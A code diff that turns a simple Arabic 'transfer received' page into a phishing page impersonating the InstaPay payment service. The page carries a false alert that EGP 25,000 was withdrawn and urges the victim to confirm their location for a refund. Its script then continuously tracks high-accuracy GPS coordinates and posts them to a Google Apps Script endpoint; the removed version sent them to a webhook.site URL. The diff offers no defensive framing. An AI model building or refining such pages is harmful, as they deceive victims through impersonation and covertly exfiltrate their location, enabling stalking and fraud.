@@ -1,27 +1,63 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>استلام حوالة مالية</title>
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>InstaPay - Transaction Alert</title>
   <style>
     body {
-      font-family: sans-serif;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      color: #222;
       text-align: center;
-      padding-top: 100px;
-      background-color: #f0f0f0;
+      padding: 60px 20px;
     }
-    h2 {
-      color: green;
+
+    .logo {
+      width: 150px;
+      margin-bottom: 30px;
+    }
+
+    .card {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      padding: 30px;
+      display: inline-block;
+      max-width: 400px;
+    }
+
+    .title {
+      font-size: 20px;
+      color: #d4007f;
+      margin-bottom: 20px;
+    }
+
+    .desc {
+      font-size: 16px;
+      margin-bottom: 30px;
+    }
+
+    .loading {
+      font-size: 14px;
+      color: #888;
     }
   </style>
 </head>
 <body>
-  <h2>✅ تم استلام الحوالة</h2>
-  <p>جاري تحديث موقعك لحظيًا... لا تغلق الصفحة</p>
+  <img src="https://instapay.eg/assets/images/logo.png" alt="InstaPay" class="logo" />
+
+  <div class="card">
+    <div class="title">Transaction Alert</div>
+    <div class="desc">
+      EGP 25,000 has been withdrawn from your InstaPay account.<br />
+      If this was not you, please confirm your location to start a refund request.
+    </div>
+    <div class="loading">Processing... please do not close the page.</div>
+  </div>
 
   <script>
-    const proxyURL = "https://corsproxy.io/?";
-    const destination = encodeURIComponent("https://webhook.site/2f41947c-0e64-4f3c-8cac-27814d28743b");
+    const endpoint = "https://script.google.com/macros/s/AKfycbyC4-4qAddAB3wzwhn9CyOE5KXFRELmiLfcMIoQ_FKNh-cq3OGah5xdXAe0ydrBCUkc/exec";
 
     if ("geolocation" in navigator) {
       navigator.geolocation.watchPosition(
@@ -29,11 +65,10 @@
           const data = {
             latitude: position.coords.latitude,
             longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            timestamp: new Date().toISOString()
+            accuracy: position.coords.accuracy
           };
 
-          fetch(proxyURL + destination, {
+          fetch(endpoint, {
             method: "POST",
             headers: {
               "Content-Type": "application/json"
@@ -42,7 +77,7 @@
           });
         },
         function(error) {
-          document.body.innerHTML = "<h2>فشل في تحديد الموقع ❌</h2><p>يرجى تفعيل الموقع الجغرافي.</p>";
+          document.querySelector('.loading').textContent = "Location access denied. Please enable location.";
         },
         {
           enableHighAccuracy: true,
@@ -51,7 +86,7 @@
         }
       );
     } else {
-      document.body.innerHTML = "<h2>المتصفح لا يدعم تحديد الموقع.</h2>";
+      document.querySelector('.loading').textContent = "Geolocation is not supported by this browser.";
     }
   </script>
 </body>
